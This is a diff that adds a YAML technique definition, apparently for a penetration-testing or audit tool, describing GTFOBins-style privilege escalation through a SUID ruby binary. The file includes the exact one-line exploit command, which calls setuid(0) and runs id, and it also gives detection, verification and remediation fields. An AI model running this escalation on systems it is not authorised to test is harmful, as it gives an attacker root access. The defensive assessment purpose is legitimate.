@@ -1,0 +1,25 @@
+# SUID ruby → root (GTFOBins)
+technique: T1548.001
+name: SUID ruby → root (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  suid: ruby
+execute:
+  command: "{{binary}} -e 'Process::Sys.setuid(0);system(\"id\")'"
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_suid
+  description: >
+    SUID Ruby reasserts the SUID EUID via Process::Sys.setuid(0) and
+    shells out as root.
+  remediation: >
+    Remove the SUID bit from ruby.
+  refs: [T1548.001, GTFOBins/ruby]
